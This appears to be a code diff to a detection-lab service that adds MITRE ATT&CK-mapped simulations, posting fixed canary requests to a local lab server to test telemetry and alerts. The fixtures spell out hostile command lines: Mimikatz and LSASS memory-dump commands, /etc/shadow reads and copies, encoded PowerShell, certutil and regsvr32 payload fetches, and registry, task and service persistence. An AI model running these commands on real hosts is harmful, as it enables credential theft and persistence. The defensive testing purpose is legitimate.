@@ -21,6 +21,13 @@ from urllib.error import HTTPError, URLError
 from uuid import uuid4
 
 from app.core.config import settings
+from app.services.atomic_event_catalog import (
+    ATOMIC_EVENT_CATEGORIES,
+    ATOMIC_EVENT_SIMULATION_IDS,
+    ATOMIC_EVENT_SPECS,
+    atomic_simulation_id,
+    build_atomic_event_requests,
+)
 
 
 logger = logging.getLogger(__name__)
@@ -31,6 +38,8 @@ _LAB_WEB_PORT = 8765
 _LAB_WEB_BASE_URL = f"http://{_LAB_WEB_HOST}:{_LAB_WEB_PORT}"
 _DEFAULT_ATTACK_LAB_WEB_URL = _LAB_WEB_BASE_URL
 _ATTACK_LAB_WEB_URL = os.environ.get("ATTACK_LAB_WEB_URL", _DEFAULT_ATTACK_LAB_WEB_URL).rstrip("/")
+_DEFAULT_ATTACK_LAB_ENDPOINT_URL = _LAB_WEB_BASE_URL
+_ATTACK_LAB_ENDPOINT_URL = os.environ.get("ATTACK_LAB_ENDPOINT_URL", _DEFAULT_ATTACK_LAB_ENDPOINT_URL).rstrip("/")
 _RUN_ID_RE = re.compile(r"^run-[a-f0-9-]{36}$")
 _LOOPBACK_BRIDGES: set[int] = set()
 _LOOPBACK_BRIDGES_LOCK = threading.Lock()
@@ -88,6 +97,106 @@ WEB_SIMULATION_REQUESTS: dict[str, list[dict[str, Any]]] = {
         {"method": "GET", "path": "/config.php.bak?ag_canary=secret_exposure", "purpose": "backup config exposure canary"},
         {"method": "GET", "path": "/id_rsa?ag_canary=secret_exposure", "purpose": "private key exposure canary"},
     ],
+    "sim-t1595-http-method-probing": [
+        {"method": "OPTIONS", "path": "/?ag_canary=http_method_probe", "purpose": "HTTP OPTIONS method probe"},
+        {"method": "TRACE", "path": "/?ag_canary=http_method_probe", "purpose": "HTTP TRACE method probe"},
+        {"method": "GET", "path": "/api/v1/status?ag_canary=http_method_probe", "headers": {"X-HTTP-Method-Override": "DELETE"}, "purpose": "method override probe"},
+    ],
+    "sim-t1595-web-404-burst": [
+        {"method": "GET", "path": "/wp-admin?ag_canary=not_found_burst", "purpose": "CMS admin probe"},
+        {"method": "GET", "path": "/phpmyadmin?ag_canary=not_found_burst", "purpose": "database admin probe"},
+        {"method": "GET", "path": "/server-status?ag_canary=not_found_burst", "purpose": "Apache status probe"},
+        {"method": "GET", "path": "/actuator/env?ag_canary=not_found_burst", "purpose": "Spring actuator probe"},
+        {"method": "GET", "path": "/.svn/entries?ag_canary=not_found_burst", "purpose": "SVN metadata probe"},
+        {"method": "GET", "path": "/owa/auth/logon.aspx?ag_canary=not_found_burst", "purpose": "OWA path probe"},
+    ],
+    "sim-t1595-tool-user-agent-fingerprint": [
+        {"method": "GET", "path": "/?ag_canary=tool_user_agent", "headers": {"User-Agent": "curl/8.6.0"}, "purpose": "curl user-agent probe"},
+        {"method": "GET", "path": "/robots.txt?ag_canary=tool_user_agent", "headers": {"User-Agent": "python-requests/2.34.2"}, "purpose": "python requests user-agent probe"},
+        {"method": "GET", "path": "/admin?ag_canary=tool_user_agent", "headers": {"User-Agent": "sqlmap/1.8.9#stable"}, "purpose": "sqlmap user-agent probe"},
+        {"method": "GET", "path": "/.git/config?ag_canary=tool_user_agent", "headers": {"User-Agent": "Nmap Scripting Engine"}, "purpose": "nmap NSE user-agent probe"},
+    ],
+    "sim-t1110-basic-auth-bruteforce": [
+        {"method": "GET", "path": "/basic-auth?ag_canary=basic_auth_bruteforce", "headers": {"Authorization": "Basic YWRtaW46U3VtbWVyMjAyNCE="}, "purpose": "basic auth failed attempt 1"},
+        {"method": "GET", "path": "/basic-auth?ag_canary=basic_auth_bruteforce", "headers": {"Authorization": "Basic YWRtaW46UGFzc3dvcmQxMjMh"}, "purpose": "basic auth failed attempt 2"},
+        {"method": "GET", "path": "/basic-auth?ag_canary=basic_auth_bruteforce", "headers": {"Authorization": "Basic YWRtaW46Q29ycmVjdEhvcnNlQmF0dGVyeTEh"}, "purpose": "basic auth final success"},
+    ],
+    "sim-t1505-suspicious-extension-upload": [
+        {"method": "POST", "path": "/upload/shell.php?ag_canary=suspicious_upload", "body": "AG_BENIGN_PHP_UPLOAD_CANARY", "headers": {"Content-Type": "application/octet-stream"}, "purpose": "PHP extension upload canary"},
+        {"method": "POST", "path": "/upload/cmd.aspx?ag_canary=suspicious_upload", "body": "AG_BENIGN_ASPX_UPLOAD_CANARY", "headers": {"Content-Type": "application/octet-stream"}, "purpose": "ASPX extension upload canary"},
+        {"method": "POST", "path": "/upload/agent.jsp?ag_canary=suspicious_upload", "body": "AG_BENIGN_JSP_UPLOAD_CANARY", "headers": {"Content-Type": "application/octet-stream"}, "purpose": "JSP extension upload canary"},
+    ],
+    "sim-t1003-shadow-file-access": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"cat","args":["/etc/shadow"],"file_path":"/etc/shadow","operation":"read","ag_canary":"shadow_file_access"}', "purpose": "Linux shadow credential-file access canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"grep","args":["root","/etc/shadow"],"file_path":"/etc/shadow","operation":"read","ag_canary":"shadow_file_access"}', "purpose": "Linux shadow search canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"cp","args":["/etc/shadow","/tmp/shadow.copy"],"file_path":"/etc/shadow","operation":"copy","ag_canary":"shadow_file_access"}', "purpose": "Linux shadow copy canary"},
+    ],
+    "sim-t1003-lsass-mimikatz-canary": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"mimikatz.exe","command":"sekurlsa::logonpasswords","target_process":"lsass.exe","operation":"credential_dump_canary","ag_canary":"mimikatz_lsass"}', "purpose": "Mimikatz command-line canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"rundll32.exe","command":"comsvcs.dll MiniDump 640 C:\\\\Windows\\\\Temp\\\\lsass.dmp full","target_process":"lsass.exe","operation":"lsass_dump_canary","ag_canary":"lsass_minidump"}', "purpose": "LSASS minidump command-line canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"procdump64.exe","command":"-ma lsass.exe C:\\\\Windows\\\\Temp\\\\lsass.dmp","target_process":"lsass.exe","operation":"lsass_dump_canary","ag_canary":"procdump_lsass"}', "purpose": "ProcDump LSASS command-line canary"},
+    ],
+    "sim-t1059-powershell-encoded-command": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"powershell.exe","command":"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA","operation":"process_create","ag_canary":"powershell_encoded"}', "purpose": "PowerShell encoded-command canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"pwsh.exe","command":"pwsh -nop -w hidden -enc SQBFAFgA","operation":"process_create","ag_canary":"powershell_encoded"}', "purpose": "PowerShell Core encoded-command canary"},
+    ],
+    "sim-t1059-cmd-shell-execution": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"cmd.exe","command":"cmd.exe /c whoami && hostname","operation":"process_create","ag_canary":"cmd_shell"}', "purpose": "cmd shell execution canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"cmd.exe","command":"cmd.exe /c dir C:\\\\Users","operation":"process_create","ag_canary":"cmd_shell"}', "purpose": "cmd directory listing canary"},
+    ],
+    "sim-t1105-certutil-transfer": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"certutil.exe","command":"certutil.exe -urlcache -split -f http://127.0.0.1/payload.bin C:\\\\Windows\\\\Temp\\\\payload.bin","operation":"process_create","ag_canary":"certutil_transfer"}', "purpose": "certutil download canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"bitsadmin.exe","command":"bitsadmin /transfer agjob http://127.0.0.1/tool.exe C:\\\\Windows\\\\Temp\\\\tool.exe","operation":"process_create","ag_canary":"certutil_transfer"}', "purpose": "BITS transfer canary"},
+    ],
+    "sim-t1547-run-key-persistence": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"reg.exe","command":"reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v AGCanary /d C:\\\\Users\\\\Public\\\\ag.exe","registry_key":"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run","operation":"registry_set","ag_canary":"run_key_persistence"}', "purpose": "Run key registry persistence canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"powershell.exe","command":"New-ItemProperty -Path HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run -Name AGCanary","registry_key":"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run","operation":"registry_set","ag_canary":"run_key_persistence"}', "purpose": "PowerShell Run key persistence canary"},
+    ],
+    "sim-t1053-scheduled-task": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"schtasks.exe","command":"schtasks /Create /SC MINUTE /TN AGCanary /TR C:\\\\Users\\\\Public\\\\ag.exe","operation":"scheduled_task_create","ag_canary":"scheduled_task"}', "purpose": "scheduled task creation canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"powershell.exe","command":"Register-ScheduledTask -TaskName AGCanary","operation":"scheduled_task_create","ag_canary":"scheduled_task"}', "purpose": "PowerShell scheduled task canary"},
+    ],
+    "sim-t1543-service-creation": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"sc.exe","command":"sc.exe create AGCanary binPath= C:\\\\Users\\\\Public\\\\ag.exe start= demand","operation":"service_create","ag_canary":"service_creation"}', "purpose": "service creation canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"powershell.exe","command":"New-Service -Name AGCanary -BinaryPathName C:\\\\Users\\\\Public\\\\ag.exe","operation":"service_create","ag_canary":"service_creation"}', "purpose": "PowerShell service creation canary"},
+    ],
+    "sim-t1218-rundll32-proxy": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"rundll32.exe","command":"rundll32.exe javascript:\\\"\\\\..\\\\mshtml,RunHTMLApplication\\\";document.write();","operation":"process_create","ag_canary":"rundll32_proxy"}', "purpose": "rundll32 LOLBin canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"rundll32.exe","command":"rundll32.exe C:\\\\Windows\\\\Temp\\\\ag.dll,Start","operation":"process_create","ag_canary":"rundll32_proxy"}', "purpose": "rundll32 DLL launch canary"},
+    ],
+    "sim-t1218-regsvr32-proxy": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"regsvr32.exe","command":"regsvr32.exe /s /n /u /i:http://127.0.0.1/calc.sct scrobj.dll","operation":"process_create","ag_canary":"regsvr32_proxy"}', "purpose": "regsvr32 scriptlet canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"regsvr32.exe","command":"regsvr32.exe /s C:\\\\Windows\\\\Temp\\\\ag.dll","operation":"process_create","ag_canary":"regsvr32_proxy"}', "purpose": "regsvr32 DLL registration canary"},
+    ],
+    "sim-t1082-system-discovery": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"systeminfo.exe","command":"systeminfo.exe","operation":"process_create","ag_canary":"system_discovery"}', "purpose": "systeminfo discovery canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"whoami.exe","command":"whoami.exe /all","operation":"process_create","ag_canary":"system_discovery"}', "purpose": "whoami discovery canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"ipconfig.exe","command":"ipconfig.exe /all","operation":"process_create","ag_canary":"system_discovery"}', "purpose": "network config discovery canary"},
+    ],
+    "sim-t1083-file-discovery": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"cmd.exe","command":"cmd.exe /c dir C:\\\\Users\\\\Public /s","file_path":"C:\\\\Users\\\\Public","operation":"file_discovery","ag_canary":"file_discovery"}', "purpose": "recursive file discovery canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"powershell.exe","command":"Get-ChildItem -Recurse C:\\\\Users\\\\Public","file_path":"C:\\\\Users\\\\Public","operation":"file_discovery","ag_canary":"file_discovery"}', "purpose": "PowerShell file discovery canary"},
+    ],
+    "sim-t1033-user-discovery": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"whoami.exe","command":"whoami.exe /user","operation":"process_create","ag_canary":"user_discovery"}', "purpose": "current user discovery canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"cmd.exe","command":"cmd.exe /c echo %USERNAME%","operation":"process_create","ag_canary":"user_discovery"}', "purpose": "environment username discovery canary"},
+    ],
+    "sim-t1057-process-discovery": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"tasklist.exe","command":"tasklist.exe /v","operation":"process_create","ag_canary":"process_discovery"}', "purpose": "tasklist process discovery canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"powershell.exe","command":"Get-Process","operation":"process_create","ag_canary":"process_discovery"}', "purpose": "PowerShell process discovery canary"},
+    ],
+    "sim-t1016-network-config-discovery": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"ipconfig.exe","command":"ipconfig.exe /all","operation":"process_create","ag_canary":"network_config_discovery"}', "purpose": "ipconfig network configuration canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"netsh.exe","command":"netsh interface show interface","operation":"process_create","ag_canary":"network_config_discovery"}', "purpose": "netsh interface discovery canary"},
+    ],
+    "sim-t1018-remote-system-discovery": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"net.exe","command":"net view /domain","operation":"process_create","ag_canary":"remote_system_discovery"}', "purpose": "domain remote system discovery canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"nltest.exe","command":"nltest /dclist:LAB","operation":"process_create","ag_canary":"remote_system_discovery"}', "purpose": "domain controller discovery canary"},
+    ],
+    "sim-t1518-software-discovery": [
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"wmic.exe","command":"wmic product get name,version","operation":"process_create","ag_canary":"software_discovery"}', "purpose": "installed software discovery canary"},
+        {"method": "POST", "path": "/endpoint/activity", "body": '{"process":"powershell.exe","command":"Get-ItemProperty HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\*","operation":"process_create","ag_canary":"software_discovery"}', "purpose": "registry software discovery canary"},
+    ],
     "sim-t1110-web-login-failures": [
         {"method": "POST", "path": "/login", "body": "username=admin&password=wrong-one&ag_canary=failed_login", "purpose": "failed login canary"},
         {"method": "POST", "path": "/login", "body": "username=admin&password=wrong-two&ag_canary=failed_login", "purpose": "second failed login canary"},
@@ -122,8 +231,50 @@ WEB_SIMULATION_REQUESTS: dict[str, list[dict[str, Any]]] = {
     ],
 }
 
-WEB_SIMULATION_IDS = set(WEB_SIMULATION_REQUESTS)
-LOG_SOURCES = {"web", "run", "access", "security", "error", "auth"}
+ENDPOINT_SIMULATION_IDS = {
+    "sim-t1003-shadow-file-access",
+    "sim-t1003-lsass-mimikatz-canary",
+    "sim-t1059-powershell-encoded-command",
+    "sim-t1059-cmd-shell-execution",
+    "sim-t1105-certutil-transfer",
+    "sim-t1547-run-key-persistence",
+    "sim-t1053-scheduled-task",
+    "sim-t1543-service-creation",
+    "sim-t1218-rundll32-proxy",
+    "sim-t1218-regsvr32-proxy",
+    "sim-t1082-system-discovery",
+    "sim-t1083-file-discovery",
+    "sim-t1033-user-discovery",
+    "sim-t1057-process-discovery",
+    "sim-t1016-network-config-discovery",
+    "sim-t1018-remote-system-discovery",
+    "sim-t1518-software-discovery",
+}
+WEB_SIMULATION_REQUESTS.update(build_atomic_event_requests())
+ENDPOINT_SIMULATION_IDS.update(ATOMIC_EVENT_SIMULATION_IDS)
+WEB_SIMULATION_IDS = set(WEB_SIMULATION_REQUESTS) - ENDPOINT_SIMULATION_IDS
+LOG_SOURCES = {"attacked_server", "web", "run", "access", "security", "error", "auth", "endpoint"}
+ENDPOINT_CANARY_CATEGORIES = {
+    "shadow_file_access",
+    "mimikatz_lsass",
+    "lsass_dump",
+    "powershell_encoded",
+    "cmd_shell",
+    "certutil_transfer",
+    "run_key_persistence",
+    "scheduled_task",
+    "service_creation",
+    "rundll32_proxy",
+    "regsvr32_proxy",
+    "system_discovery",
+    "file_discovery",
+    "user_discovery",
+    "process_discovery",
+    "network_config_discovery",
+    "remote_system_discovery",
+    "software_discovery",
+}
+ENDPOINT_CANARY_CATEGORIES.update(ATOMIC_EVENT_CATEGORIES)
 
 
 @dataclass(frozen=True)
@@ -334,6 +485,380 @@ SIMULATIONS: list[Simulation] = [
         emits_network_traffic=True,
     ),
     Simulation(
+        id="sim-t1595-http-method-probing",
+        technique_id="T1595",
+        name="HTTP method and override probing",
+        category="web-reconnaissance",
+        risk_level=1,
+        target_types=["http", "https", "web"],
+        description="Send real OPTIONS, TRACE, and method-override probes to the lab web server to validate method-anomaly telemetry.",
+        expected_telemetry=["OPTIONS request", "TRACE request", "method override header", "405/200 status", "WAF method_probe alert"],
+        safety_controls=["lab server only", "fixed methods", "no payload execution", "no external target"],
+        steps=[
+            "Send OPTIONS and TRACE requests to the lab target.",
+            "Send a benign request with X-HTTP-Method-Override.",
+            "Validate HTTP method anomaly detections from access and WAF-style logs.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1595-web-404-burst",
+        technique_id="T1595",
+        name="Web 404 discovery burst",
+        category="web-reconnaissance",
+        risk_level=1,
+        target_types=["http", "https", "web"],
+        description="Generate a small real 404 burst against common admin and technology paths to validate path-scan detections.",
+        expected_telemetry=["multiple 404 statuses", "CMS/admin paths", "same source correlation", "not_found_burst alert"],
+        safety_controls=["six fixed paths only", "lab server only", "no directory brute force", "no recursion"],
+        steps=[
+            "Request a fixed list of common admin and technology paths.",
+            "Observe real NGINX 404 access log lines from the attacked server.",
+            "Validate detection logic for short path-discovery bursts.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1595-tool-user-agent-fingerprint",
+        technique_id="T1595",
+        name="Scanner and tool user-agent fingerprinting",
+        category="reconnaissance",
+        risk_level=1,
+        target_types=["http", "https", "web"],
+        description="Send real HTTP requests with fixed scanner/tool user-agents to validate server-side telemetry and parser coverage.",
+        expected_telemetry=["curl user-agent", "python-requests user-agent", "sqlmap user-agent", "Nmap NSE user-agent", "tool_user_agent alert"],
+        safety_controls=["lab server only", "fixed benign requests", "no exploit payload", "no scan volume"],
+        steps=[
+            "Send benign requests with tool-like user-agent headers.",
+            "Record headers in structured web telemetry and real access logs.",
+            "Validate detections that key on tool fingerprints and request context.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1110-basic-auth-bruteforce",
+        technique_id="T1110.001",
+        name="HTTP Basic authentication brute-force sequence",
+        category="credential-attack",
+        risk_level=2,
+        target_types=["http", "https", "web"],
+        description="Perform a fixed lab-only Basic auth sequence against the attacked web server and record auth/access/security telemetry.",
+        expected_telemetry=["Authorization header present", "401 failures", "final 200 success", "basic_auth_bruteforce alert", "auth log password hash"],
+        safety_controls=["lab credentials only", "three requests only", "authorization header redacted in stored telemetry", "no external target"],
+        steps=[
+            "Send two failed Basic auth requests for the lab admin user.",
+            "Send one known-good lab Basic auth request for success telemetry.",
+            "Validate access, auth, and WAF-style detection output.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1505-suspicious-extension-upload",
+        technique_id="T1505.003",
+        name="Suspicious web extension upload",
+        category="persistence-canary",
+        risk_level=1,
+        target_types=["http", "https", "web"],
+        description="POST benign upload bodies to suspicious web extension paths so the attacked server emits real upload telemetry.",
+        expected_telemetry=["POST upload paths", "php/aspx/jsp extension", "body length/hash", "suspicious_upload alert"],
+        safety_controls=["benign payload text only", "no file is persisted", "lab server only", "fixed extension list"],
+        steps=[
+            "POST benign bodies to PHP, ASPX, and JSP upload paths.",
+            "Record real access log lines and structured body metadata.",
+            "Validate detections for suspicious server-side extension upload attempts.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1003-shadow-file-access",
+        technique_id="T1003.008",
+        name="Linux /etc/shadow access canary",
+        category="credential-dumping-canary",
+        risk_level=2,
+        target_types=["endpoint", "linux-endpoint"],
+        description="Generate lab-only internal activity telemetry for attempted Linux shadow credential-file access without reading any real files.",
+        expected_telemetry=["process/file access event", "/etc/shadow path", "read/copy operation", "credential_file_access alert", "run correlation ID"],
+        safety_controls=["canary event only", "no real file read", "no host /etc/shadow access", "local lab server only", "fixed payloads"],
+        steps=[
+            "POST fixed internal-activity canaries to the lab target.",
+            "The attacked server records process/file telemetry but does not read or copy /etc/shadow.",
+            "Validate detection logic for credential-file access and suspicious shadow file handling.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1003-lsass-mimikatz-canary",
+        technique_id="T1003.001",
+        name="LSASS and Mimikatz usage canary",
+        category="credential-dumping-canary",
+        risk_level=2,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate lab-only process telemetry for Mimikatz/LSASS dumping patterns without running tools or touching memory.",
+        expected_telemetry=["process command line", "lsass.exe target", "mimikatz indicator", "credential_dumping alert", "run correlation ID"],
+        safety_controls=["canary event only", "no Mimikatz execution", "no memory dump", "no credential access", "local lab server only"],
+        steps=[
+            "POST fixed process telemetry canaries to the lab target.",
+            "The attacked server records command-line-shaped telemetry but never executes Mimikatz, rundll32, or ProcDump.",
+            "Validate detections for LSASS access, Mimikatz command strings, and suspicious dump command lines.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1059-powershell-encoded-command",
+        technique_id="T1059.001",
+        name="PowerShell encoded command execution",
+        category="execution-canary",
+        risk_level=2,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate endpoint process telemetry for encoded PowerShell execution patterns without running commands.",
+        expected_telemetry=["Sysmon process creation", "powershell.exe or pwsh.exe", "EncodedCommand flag", "hidden/no-profile flags", "run correlation ID"],
+        safety_controls=["endpoint telemetry fixture only", "no command execution", "fixed command-line canaries", "no external target"],
+        steps=[
+            "POST fixed PowerShell process-create canaries to the endpoint lab target.",
+            "The endpoint fixture records Sysmon-style process events only.",
+            "Validate detection logic for encoded PowerShell and bypass-style flags.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1059-cmd-shell-execution",
+        technique_id="T1059.003",
+        name="Windows command shell execution",
+        category="execution-canary",
+        risk_level=1,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate endpoint process telemetry for cmd.exe shell execution patterns without running commands.",
+        expected_telemetry=["Sysmon process creation", "cmd.exe", "/c command flag", "discovery command string", "run correlation ID"],
+        safety_controls=["endpoint telemetry fixture only", "no shell execution", "fixed command-line canaries"],
+        steps=[
+            "POST cmd.exe process-create canaries to the endpoint lab target.",
+            "Record command-line-shaped telemetry without creating a shell.",
+            "Validate command-shell execution detections.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1105-certutil-transfer",
+        technique_id="T1105",
+        name="Certutil and BITS ingress tool transfer",
+        category="transfer-canary",
+        risk_level=2,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate endpoint process telemetry for LOLBin-based tool transfer commands without downloading files.",
+        expected_telemetry=["certutil.exe", "bitsadmin.exe", "URL in command line", "destination path", "process creation"],
+        safety_controls=["no network download", "no file write", "endpoint telemetry fixture only", "fixed canaries"],
+        steps=[
+            "POST certutil and BITS command-line canaries to the endpoint target.",
+            "Record process creation telemetry with URL and destination path indicators.",
+            "Validate ingress tool transfer detections without transferring content.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1547-run-key-persistence",
+        technique_id="T1547.001",
+        name="Registry Run key persistence",
+        category="persistence-canary",
+        risk_level=2,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate registry-set telemetry for Run key persistence patterns without modifying a registry.",
+        expected_telemetry=["Registry value set", "HKCU Run key", "reg.exe or PowerShell", "persistence alert", "run correlation ID"],
+        safety_controls=["no real registry write", "endpoint telemetry fixture only", "fixed key path"],
+        steps=[
+            "POST Run-key persistence canaries to the endpoint target.",
+            "Record registry-set shaped telemetry with the Run key path.",
+            "Validate persistence detection logic for autorun registry keys.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1053-scheduled-task",
+        technique_id="T1053.005",
+        name="Scheduled task creation",
+        category="persistence-canary",
+        risk_level=2,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate scheduled-task creation telemetry without creating a task.",
+        expected_telemetry=["schtasks.exe", "Register-ScheduledTask", "task name", "process creation", "scheduled_task alert"],
+        safety_controls=["no task creation", "endpoint telemetry fixture only", "fixed task name"],
+        steps=[
+            "POST schtasks and PowerShell scheduled-task canaries.",
+            "Record process telemetry for task creation patterns.",
+            "Validate scheduled-task persistence detections.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1543-service-creation",
+        technique_id="T1543.003",
+        name="Windows service creation",
+        category="persistence-canary",
+        risk_level=2,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate service-creation telemetry without creating a service.",
+        expected_telemetry=["sc.exe create", "New-Service", "service name", "binary path", "service_creation alert"],
+        safety_controls=["no service creation", "endpoint telemetry fixture only", "fixed service name"],
+        steps=[
+            "POST service creation command-line canaries.",
+            "Record process telemetry with service name and binary path indicators.",
+            "Validate service persistence detections.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1218-rundll32-proxy",
+        technique_id="T1218.011",
+        name="Rundll32 signed binary proxy execution",
+        category="defense-evasion-canary",
+        risk_level=2,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate rundll32 proxy-execution telemetry without loading DLLs or scripts.",
+        expected_telemetry=["rundll32.exe", "suspicious command line", "DLL/function launch", "process creation"],
+        safety_controls=["no DLL load", "no script execution", "endpoint telemetry fixture only"],
+        steps=[
+            "POST rundll32 command-line canaries to the endpoint target.",
+            "Record process creation telemetry only.",
+            "Validate signed-binary proxy execution detections.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1218-regsvr32-proxy",
+        technique_id="T1218.010",
+        name="Regsvr32 signed binary proxy execution",
+        category="defense-evasion-canary",
+        risk_level=2,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate regsvr32 proxy-execution telemetry without registering DLLs or fetching scriptlets.",
+        expected_telemetry=["regsvr32.exe", "scrobj.dll", "scriptlet URL", "process creation", "proxy execution alert"],
+        safety_controls=["no DLL registration", "no network fetch", "endpoint telemetry fixture only"],
+        steps=[
+            "POST regsvr32 scriptlet and DLL-registration canaries.",
+            "Record process creation telemetry with proxy-execution indicators.",
+            "Validate regsvr32 LOLBin detections.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1082-system-discovery",
+        technique_id="T1082",
+        name="System information discovery",
+        category="discovery-canary",
+        risk_level=1,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate process telemetry for common system discovery commands without executing them.",
+        expected_telemetry=["systeminfo.exe", "whoami.exe", "ipconfig.exe", "process creation", "discovery command sequence"],
+        safety_controls=["no command execution", "endpoint telemetry fixture only", "fixed discovery commands"],
+        steps=[
+            "POST systeminfo, whoami, and ipconfig process canaries.",
+            "Record endpoint process telemetry for discovery command sequence detection.",
+            "Validate discovery detections and correlation logic.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1083-file-discovery",
+        technique_id="T1083",
+        name="File and directory discovery",
+        category="discovery-canary",
+        risk_level=1,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate file-discovery telemetry without traversing the filesystem.",
+        expected_telemetry=["cmd dir", "PowerShell Get-ChildItem", "target path", "file_discovery alert", "run correlation ID"],
+        safety_controls=["no filesystem traversal", "endpoint telemetry fixture only", "fixed public path"],
+        steps=[
+            "POST cmd and PowerShell file-discovery canaries.",
+            "Record file-discovery shaped telemetry without touching real files.",
+            "Validate file and directory discovery detections.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1033-user-discovery",
+        technique_id="T1033",
+        name="System owner and user discovery",
+        category="discovery-canary",
+        risk_level=1,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate user-discovery process telemetry without running commands.",
+        expected_telemetry=["whoami.exe", "username environment lookup", "process creation", "user_discovery alert"],
+        safety_controls=["no command execution", "endpoint telemetry fixture only", "fixed discovery commands"],
+        steps=[
+            "POST user-discovery process canaries to the endpoint target.",
+            "Record Sysmon-style process telemetry with user-discovery command lines.",
+            "Validate system-owner/user discovery detections.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1057-process-discovery",
+        technique_id="T1057",
+        name="Process discovery",
+        category="discovery-canary",
+        risk_level=1,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate process-discovery telemetry without listing real processes.",
+        expected_telemetry=["tasklist.exe", "Get-Process", "process creation", "process_discovery alert"],
+        safety_controls=["no process enumeration", "endpoint telemetry fixture only", "fixed discovery commands"],
+        steps=[
+            "POST tasklist and PowerShell process-discovery canaries.",
+            "Record process telemetry without enumerating the host.",
+            "Validate process discovery detections.",
+        ],
+        emits_network_traffic=True,
+    ),
+    Simulation(
+        id="sim-t1016-network-config-discovery",
+        technique_id="T1016",
+        name="System network configuration discovery",
+        category="discovery-canary",
+        risk_level=1,
+        target_types=["endpoint", "windows-endpoint"],
+        description="Generate network-configuration discovery telemetry without querying host networking.",
+        expected_telemetry=["ipconfig.exe", "netsh.exe", "interface discovery", "network_config_discovery alert"],
